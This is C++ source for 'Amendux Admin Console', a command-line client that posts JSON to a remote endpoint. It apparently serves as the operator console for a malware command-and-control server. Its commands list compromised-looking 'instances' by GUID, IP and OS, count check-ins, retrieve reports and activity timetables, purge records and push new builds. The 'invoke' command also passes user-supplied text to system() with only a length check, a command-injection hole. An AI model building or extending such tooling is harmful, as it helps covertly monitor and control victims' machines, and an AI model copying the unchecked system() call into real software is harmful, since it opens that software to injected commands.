// AdminConsole.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <curl\curl.h>
#include "Json.h"

#include <iostream>
#include <string>
#include <sstream>
#include <algorithm>
#include <iterator>
#include <iomanip>

void theW00t();
JSONValue *RestCall(const std::string& endpoint, const std::string& auth, int code, JSONValue *data = new JSONValue(), bool status = true);

std::string name;
std::string endpoint;
std::string userpass;
std::string instance;

BOOL WINAPI consoleHandler(DWORD signal) {

	if (signal == CTRL_C_EVENT) {
		printf("Ctrl-C handled\n"); // do cleanup
	}

	return TRUE;
}

int main(int argc, char *argv[], char *envp[])
{
	std::cout << "********************************************************************************" << std::endl;
	std::cout << "*                                [ ADMIN CONSOLE ]                             *" << std::endl;
	std::cout << "*                              [ Amendux (c) 2016. ]                           *" << std::endl;
	std::cout << "********************************************************************************" << std::endl;

	if (argc > 1) {
		endpoint = argv[1];
		userpass = argv[2];

		if (argc > 3) {
			instance = argv[3];
		}
	}

	SetConsoleTitle(L"Admin Console");

	//if (!SetConsoleCtrlHandler(consoleHandler, TRUE)) {
	//	std::cerr << "Could not set control handler" << std::endl;
	//	return 1;
	//}
	JSONValue *response;

	do {
		if (endpoint.empty() || userpass.empty()) {
			std::cout << "endpoint> ";
			std::cin >> endpoint;

			std::cout << "auth> ";
			std::cin >> userpass;
		}
	} while (!(response = RestCall(endpoint, userpass, 700)));

	std::wstring wname;
	wname = response->Child(L"name")->AsString();
	name = std::string(wname.begin(), wname.end());

	if (instance.empty()) {
		std::cout << "Instances:\t" << response->Child(L"instances")->AsNumber() << std::endl;
		std::cout << "Checkins:\t" << response->Child(L"checkins")->AsNumber() << std::endl;

		SetConsoleTitle(L"Admin Console Main: Connected");
	} else {
		std::cout << "Instance:\t" << instance << std::endl;

		SetConsoleTitle(L"Admin Console Invoked: Connected");
	}

	std::cin.ignore(10000, '\n');

	while (true) {
		std::string command;

		std::cout << (!instance.empty() ? instance : name) << " > ";
		std::getline(std::cin, command);
		if (command.empty()) {
			continue;
		}

		if (!command.compare("help") || !command.compare("?")) {

			if (instance.empty()) {
				std::cout << std::left << std::setw(25) << std::setfill(' ') << "help" << "Show help" << std::endl;
				std::cout << std::left << std::setw(25) << std::setfill(' ') << "instances" << "List all instances" << std::endl;
				std::cout << std::left << std::setw(25) << std::setfill(' ') << "settings" << "List current settings" << std::endl;
				std::cout << std::left << std::setw(25) << std::setfill(' ') << "set <key> <value>" << "Set config setting" << std::endl;
				std::cout << std::left << std::setw(25) << std::setfill(' ') << "invoke <instance>" << "Start session with instance" << std::endl;
				std::cout << std::left << std::setw(25) << std::setfill(' ') << "password <passwd>" << "Change master password" << std::endl;
				std::cout << std::left << std::setw(25) << std::setfill(' ') << "update <file> <build>" << "Dispatch new version to server" << std::endl;
			} else {
				std::cout << std::left << std::setw(25) << std::setfill(' ') << "help" << "Show help" << std::endl;
				std::cout << std::left << std::setw(25) << std::setfill(' ') << "info" << "All info about this instance" << std::endl;
				std::cout << std::left << std::setw(25) << std::setfill(' ') << "report" << "Retrieve last report from instance" << std::endl;
				std::cout << std::left << std::setw(25) << std::setfill(' ') << "alive" << "Timetable when system was active" << std::endl;
				std::cout << std::left << std::setw(25) << std::setfill(' ') << "purge" << "Purge instance record" << std::endl;
				std::cout << std::left << std::setw(25) << std::setfill(' ') << "name <name>" << "Change instance name" << std::endl;
			}

			continue;
		}

		if (!command.compare("w00t!")) {
			theW00t();
			continue;
		}

		if (!command.compare("instances") && instance.empty()) {
			response = RestCall(endpoint, userpass, 701);
			if (!response) {
				continue;
			}

			if (!response->IsArray()) {
				continue;
			}

			std::cout << std::left << std::setw(39) << std::setfill(' ') << "QUID";
			std::cout << "| " << std::left << std::setw(13) << std::setfill(' ') << "IP";
			std::cout << "| " << std::left << std::setw(18) << std::setfill(' ') << "OS";
			std::cout << "| " << std::left << std::setfill(' ') << "Name" << std::endl;
			std::cout << std::right << std::setw(40) << std::setfill('-') << '+' << std::setw(15) << std::setfill('-') << '+' << std::setw(20) << std::setfill('-') << '+' << std::setw(20) << std::setfill('-') << ' ' << std::endl;

			for (auto const& inst : response->AsArray()) {
				if (!inst->IsObject()) {
					continue;
				}
			
				std::wcout << inst->Child(L"guid")->AsString() << " | " << inst->Child(L"remote")->AsString() << " | " << std::left << std::setw(17) << std::setfill(L' ') << inst->Child(L"os_version")->AsString() << " | " << (inst->Child(L"name")->IsNull() ? L"" : inst->Child(L"name")->AsString()) << std::endl;
			}

			continue;
		}

		if (!command.compare("settings") && instance.empty()) {
			response = RestCall(endpoint, userpass, 703);
			if (!response) {
				continue; // discon?
			}

			if (!response->IsObject()) {
				continue;
			}

			std::cout << std::left << std::setw(20) << std::setfill(' ') << "Key";
			std::cout << "| " << std::left << std::setw(50) << std::setfill(' ') << "Value" << std::endl;
			std::cout << std::right << std::setw(21) << std::setfill('-') << '+' << std::setw(50) << std::setfill('-') << ' ' << std::endl;

			JSONObject obj = response->AsObject();
			JSONObject::iterator it_obj;
			for (it_obj = obj.begin(); it_obj != obj.end(); it_obj++) {
				std::wcout << std::left << std::setw(20) << std::setfill(L' ') << it_obj->first;
				std::wcout << L"| " << std::left << it_obj->second->AsString() << std::endl;
			}

			continue;
		}

		if (!command.substr(0, 4).compare("info") && !instance.empty()) {
			response = RestCall(endpoint, userpass, 701);
			if (!response) {
				continue;
			}

			if (!response->IsArray()) {
				continue;
			}

			for (auto const& inst : response->AsArray()) {
				if (!inst->IsObject()) {
					continue;
				}

				std::wstring wquid = inst->Child(L"guid")->AsString();
				std::string _quid(wquid.begin(), wquid.end());
				if (!instance.compare(_quid)) {

					std::cout << std::left << std::setw(30) << std::setfill(' ') << "Key";
					std::cout << "| " << std::left << std::setw(50) << std::setfill(' ') << "Value" << std::endl;
					std::cout << std::right << std::setw(31) << std::setfill('-') << '+' << std::setw(50) << std::setfill('-') << ' ' << std::endl;

					JSONObject obj = inst->AsObject();
					JSONObject::iterator it_obj;
					for (it_obj = obj.begin(); it_obj != obj.end(); it_obj++) {

						std::wcout << std::left << std::setw(30) << std::setfill(L' ') << it_obj->first;
						std::wcout << L"| " << std::left;

						if (it_obj->second->IsNull()) {
							std::wcout << "" << std::endl;
						} else {
							std::wcout << it_obj->second->AsString() << std::endl;
						}
					}

				}

			}

			continue;
		}

		if (!command.substr(0, 3).compare("set") && instance.empty()) {
			std::istringstream iss(command);

			std::vector<std::string> tokens;
			std::copy(std::istream_iterator<std::string>(iss), std::istream_iterator<std::string>(), std::back_inserter(tokens));

			if (tokens.size() != 3) {
				std::cerr << "Too few arguments" << std::endl;
				continue;
			}

			std::wstring key(tokens.at(1).begin(), tokens.at(1).end());
			std::wstring value(tokens.at(2).begin(), tokens.at(2).end());

			JSONObject obj;
			obj[key] = new JSONValue(value);

			RestCall(endpoint, userpass, 703, new JSONValue(obj));

			continue;
		}

		if (!command.substr(0, 8).compare("password") && instance.empty()) {
			if (command.size() < 10) {
				std::cerr << "Too few arguments" << std::endl;
				continue;
			}

			std::string password = command.substr(9);
			if (password.length() < 22) {
				std::cerr << "Password must have 22 characters at least" << std::endl;
				continue;
			}

			std::wstring pwd(password.begin(), password.end());

			JSONObject obj;
			obj[L"password"] = new JSONValue(pwd);

			RestCall(endpoint, userpass, 704, new JSONValue(obj));

			userpass = "admin:" + password;

			continue;
		}

		if (!command.substr(0, 6).compare("invoke") && instance.empty()) {
			TCHAR szFileName[MAX_PATH];

			std::string quid = command.substr(7);
			if (quid.length() != 38) {
				std::cerr << "GUID malformed" << std::endl;
				continue;
			}

			GetModuleFileName(NULL, szFileName, MAX_PATH);

			std::wstring wcommand = L"start " + std::wstring(szFileName) + L" ";
			std::string command(wcommand.begin(), wcommand.end());
			command += endpoint + " ";
			command += userpass + " ";
			command += quid;

			system(command.c_str());
		
			continue;
		}

		if (!command.compare("exit") || !command.compare("quit")) {
			break;
		}

		std::cerr << "Unknown command '" << command << "'" << std::endl;
	}

    return 0;
}

static size_t writeCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
	((std::string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}

JSONValue *RestCall(const std::string& endpoint, const std::string& auth, int code, JSONValue *data, bool status)
{
	CURL *curl;
	CURLcode res;
	std::string readBuffer;
	bool bSuccess = false;
	
	JSONObject reqObj;
	reqObj[L"data"] = data;
	reqObj[L"code"] = new JSONValue(static_cast<double>(code));
	reqObj[L"success"] = new JSONValue(status);

	std::wstring wdataObj = L"data=" + JSONValue(reqObj).Stringify();
	std::string dataObj(wdataObj.begin(), wdataObj.end());

	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, endpoint.c_str());
		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
		curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 15);
		curl_easy_setopt(curl, CURLOPT_USERAGENT, "Amendux Admin Console/0.3");
		curl_easy_setopt(curl, CURLOPT_USERPWD, auth.c_str());
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, dataObj.c_str());
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

		/* Perform the request, res will get the return code */
		res = curl_easy_perform(curl);

		/* Check for errors */
		if (res != CURLE_OK) {
			std::cerr << "Connection to admin interface failed" << std::endl;
		}

		long http_code = 0;
		curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
		if (http_code == 200) {
			bSuccess = true;
		} else if (http_code == 401) {
			std::cerr << "Authentication failed" << std::endl;
		} else {
			std::cerr << "Connection to admin interface failed" << std::endl;
		}

		/* always cleanup */
		curl_easy_cleanup(curl);
	}

	if (!bSuccess) {
		return nullptr;
	}

	JSONValue *recvObj = JSON::Parse(readBuffer.c_str());
	if (!recvObj->IsObject()) {
		std::cerr << "Server returned no object" << std::endl;
	}

	if (!recvObj->Child(L"success")->AsBool()) {
		std::cerr << "Server returned error status" << std::endl;
	}

	if (!recvObj->Child(L"code")->IsNumber()) {
		std::cerr << "Server returned no statuscode" << std::endl;
	}

	return recvObj->Child(L"data");
}

void theW00t()
{
	std::cout << "                   ,%%%," << std::endl;
	std::cout << "                 ,%%%` %==--" << std::endl;
	std::cout << "                ,%%`( '|" << std::endl;
	std::cout << "               ,%%@ /\\_/" << std::endl;
	std::cout << "     ,%.-\"\"\"--%%% \"@@__  " << std::endl;
	std::cout << "    %%/             |__`\\       " << std::endl;
	std::cout << "   .%'\\     |   \\   /  //" << std::endl;
	std::cout << "   ,%' >   .'----\\ |  [/" << std::endl;
	std::cout << "      < <<`       ||      " << std::endl;
	std::cout << "      ||          ||        " << std::endl;
	std::cout << "      )\\\\         )\\" << std::endl;
	std::cout << "Unicorn inside..." << std::endl;
}
